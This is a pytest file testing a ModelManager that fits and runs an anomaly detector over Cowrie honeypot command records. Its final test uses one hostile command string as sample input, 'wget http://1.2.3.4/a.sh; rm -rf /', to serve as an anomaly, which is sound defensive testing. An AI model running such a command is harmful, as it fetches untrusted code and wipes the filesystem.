"""Isolated unit tests for ModelManager.

Uses directly constructed DatasetRecord objects and simple fake
collaborators — orchestration is proven without depending on
IsolationForest's exact scores. One additional test exercises the
real AnomalyDetector to confirm the manager works with the real
component. Requires no Cowrie, no Docker, no network, no database, no
real log files, and no other external services.
"""

import dataclasses

import pytest

from core.ai_engine.anomaly_detector import AnomalyDetector
from core.ai_engine.anomaly_result import AnomalyResult
from core.ai_engine.feature_matrix import FEATURE_NAMES, FeatureMatrix
from core.ai_engine.model_manager import ModelManager
from core.dataset_manager.builder import DatasetRecord


def _make_record(**overrides) -> DatasetRecord:
    defaults = dict(
        timestamp="2026-08-19T18:00:22.557428Z",
        source_ip="127.0.0.1",
        session_id="ce82815367a4",
        protocol="ssh",
        honeypot="Cowrie",
        event_type="cowrie.command.input",
        category="command_execution",
        severity="low",
        command="pwd",
        has_command=True,
        command_length=3,
        has_url=False,
        has_ip_address=False,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    defaults.update(overrides)
    return DatasetRecord(**defaults)


class _FakeMatrixBuilder:
    """Fake FeatureMatrixBuilder that records every call it receives."""

    def __init__(self):
        self.build_calls = []

    def build(self, records):
        record_list = list(records)
        self.build_calls.append(record_list)
        return FeatureMatrix(
            feature_names=FEATURE_NAMES,
            rows=[(0, 0, 0, 0, 0, 0)] * len(record_list),
        )


class _FakeDetector:
    """Fake AnomalyDetector recording fit()/predict()/score() calls."""

    def __init__(self, predictions=None, scores=None):
        self.fit_calls = []
        self.predict_calls = []
        self.score_calls = []
        self._predictions = predictions if predictions is not None else []
        self._scores = scores if scores is not None else []

    def fit(self, matrix):
        self.fit_calls.append(matrix)

    def predict(self, matrix):
        self.predict_calls.append(matrix)
        return list(self._predictions)

    def score(self, matrix):
        self.score_calls.append(matrix)
        return list(self._scores)


class _FakeResultBuilder:
    """Fake AnomalyResultBuilder that records inputs and returns real AnomalyResults."""

    def __init__(self):
        self.build_calls = []

    def build(self, record, prediction, score):
        self.build_calls.append((record, prediction, score))
        return AnomalyResult(
            record=record,
            prediction=prediction,
            score=float(score),
            is_anomaly=(prediction == -1),
        )


def _make_manager(predictions=None, scores=None):
    return ModelManager(
        matrix_builder=_FakeMatrixBuilder(),
        detector=_FakeDetector(predictions=predictions, scores=scores),
        result_builder=_FakeResultBuilder(),
    )


def test_fit_accepts_non_empty_training_records():
    manager = _make_manager()
    training_records = [_make_record(command="pwd"), _make_record(command="ls")]

    manager.fit(training_records)  # should not raise


def test_fit_rejects_empty_input():
    manager = _make_manager()

    with pytest.raises(ValueError):
        manager.fit([])


def test_predict_before_fit_raises_runtime_error():
    manager = _make_manager()

    with pytest.raises(RuntimeError):
        manager.predict([_make_record()])


def test_predict_after_fit_returns_one_result_per_input_record():
    manager = _make_manager(predictions=[1, -1], scores=[0.2, -0.3])
    manager.fit([_make_record(command="pwd")])

    results = manager.predict([_make_record(command="ls"), _make_record(command="whoami")])

    assert len(results) == 2


def test_empty_inference_input_returns_empty_list_after_fitting():
    manager = _make_manager()
    manager.fit([_make_record(command="pwd")])

    assert manager.predict([]) == []


def test_training_and_inference_records_can_be_different():
    training_records = [_make_record(command="pwd"), _make_record(command="ls")]
    inference_records = [_make_record(command="whoami"), _make_record(command="id")]

    manager = _make_manager(predictions=[1, -1], scores=[0.1, -0.4])
    manager.fit(training_records)
    results = manager.predict(inference_records)

    assert [result.record for result in results] == inference_records
    assert all(result.record not in training_records for result in results)


def test_detector_fit_is_called_during_fit():
    fake_detector = _FakeDetector(predictions=[1], scores=[0.1])
    manager = ModelManager(
        matrix_builder=_FakeMatrixBuilder(),
        detector=fake_detector,
        result_builder=_FakeResultBuilder(),
    )

    manager.fit([_make_record(command="pwd")])

    assert len(fake_detector.fit_calls) == 1


def test_detector_fit_is_not_called_during_predict():
    fake_detector = _FakeDetector(predictions=[1], scores=[0.1])
    manager = ModelManager(
        matrix_builder=_FakeMatrixBuilder(),
        detector=fake_detector,
        result_builder=_FakeResultBuilder(),
    )

    manager.fit([_make_record(command="pwd")])
    manager.predict([_make_record(command="ls")])
    manager.predict([_make_record(command="whoami")])

    assert len(fake_detector.fit_calls) == 1


def test_feature_matrix_builder_is_used_for_both_training_and_inference():
    fake_matrix_builder = _FakeMatrixBuilder()
    manager = ModelManager(
        matrix_builder=fake_matrix_builder,
        detector=_FakeDetector(predictions=[1], scores=[0.1]),
        result_builder=_FakeResultBuilder(),
    )
    training_records = [_make_record(command="pwd")]
    inference_records = [_make_record(command="ls")]

    manager.fit(training_records)
    manager.predict(inference_records)

    assert fake_matrix_builder.build_calls == [training_records, inference_records]


def test_anomaly_result_builder_is_used_for_inference_results():
    fake_result_builder = _FakeResultBuilder()
    manager = ModelManager(
        matrix_builder=_FakeMatrixBuilder(),
        detector=_FakeDetector(predictions=[1, -1], scores=[0.1, -0.2]),
        result_builder=fake_result_builder,
    )
    manager.fit([_make_record(command="pwd")])

    manager.predict([_make_record(command="ls"), _make_record(command="whoami")])

    assert len(fake_result_builder.build_calls) == 2


def test_input_order_is_preserved():
    manager = _make_manager(predictions=[1, -1, 1], scores=[0.1, -0.2, 0.3])
    manager.fit([_make_record(command="pwd")])

    records = [
        _make_record(command="a"),
        _make_record(command="b"),
        _make_record(command="c"),
    ]
    results = manager.predict(records)

    assert [result.record.command for result in results] == ["a", "b", "c"]


def test_original_dataset_record_identity_is_preserved():
    manager = _make_manager(predictions=[1], scores=[0.1])
    manager.fit([_make_record(command="pwd")])

    record = _make_record(command="ls")
    results = manager.predict([record])

    assert results[0].record is record


def test_input_records_are_not_modified():
    manager = _make_manager(predictions=[1], scores=[0.1])
    training_record = _make_record(command="pwd", command_length=3)
    manager.fit([training_record])

    inference_record = _make_record(command="ls", command_length=2)
    original_command = inference_record.command
    original_length = inference_record.command_length

    manager.predict([inference_record])

    assert training_record.command == "pwd"
    assert training_record.command_length == 3
    assert inference_record.command == original_command
    assert inference_record.command_length == original_length


def test_prediction_and_score_are_paired_with_correct_records():
    record_a = _make_record(command="pwd")
    record_b = _make_record(command="ls")

    manager = _make_manager(predictions=[1, -1], scores=[0.5, -0.7])
    manager.fit([_make_record(command="training")])

    results = manager.predict([record_a, record_b])

    assert results[0].record is record_a
    assert results[0].prediction == 1
    assert results[0].score == 0.5
    assert results[1].record is record_b
    assert results[1].prediction == -1
    assert results[1].score == -0.7


def test_dependency_injection_works():
    fake_matrix_builder = _FakeMatrixBuilder()
    fake_detector = _FakeDetector(predictions=[-1], scores=[-0.9])
    fake_result_builder = _FakeResultBuilder()

    manager = ModelManager(
        matrix_builder=fake_matrix_builder,
        detector=fake_detector,
        result_builder=fake_result_builder,
    )
    manager.fit([_make_record(command="pwd")])
    results = manager.predict([_make_record(command="ls")])

    assert len(fake_matrix_builder.build_calls) == 2
    assert len(fake_detector.fit_calls) == 1
    assert len(fake_result_builder.build_calls) == 1
    assert results[0].prediction == -1


def test_repeated_deterministic_inference_gives_identical_results():
    manager = _make_manager(predictions=[1, -1], scores=[0.3, -0.4])
    manager.fit([_make_record(command="pwd")])

    records = [_make_record(command="a"), _make_record(command="b")]
    first_results = manager.predict(records)
    second_results = manager.predict(records)

    assert first_results == second_results


def test_no_attack_or_benign_labels_are_introduced():
    result_fields = {field.name for field in dataclasses.fields(AnomalyResult)}
    forbidden = {
        "attack_label",
        "benign_label",
        "malware",
        "brute_force",
        "confidence",
        "probability",
        "threat_level",
    }
    assert result_fields.isdisjoint(forbidden)
    assert result_fields == {"record", "prediction", "score", "is_anomaly"}


def test_real_anomaly_detector_works_with_model_manager():
    # Confirms ModelManager works with the real AnomalyDetector, not
    # just fakes — without depending on exact sklearn scores.
    manager = ModelManager(detector=AnomalyDetector(contamination=0.1, random_state=42))

    training_records = [
        _make_record(command="pwd", command_length=3, has_command=True) for _ in range(9)
    ]
    manager.fit(training_records)

    new_records = [
        _make_record(command="pwd", command_length=3, has_command=True),
        _make_record(
            command="wget http://1.2.3.4/a.sh; rm -rf /",
            command_length=500,
            has_command=True,
            has_url=True,
            has_ip_address=True,
            has_file_path=True,
            has_shell_metacharacters=True,
        ),
    ]
    results = manager.predict(new_records)

    assert len(results) == 2
    assert all(result.prediction in (1, -1) for result in results)
    assert all(result.is_anomaly == (result.prediction == -1) for result in results)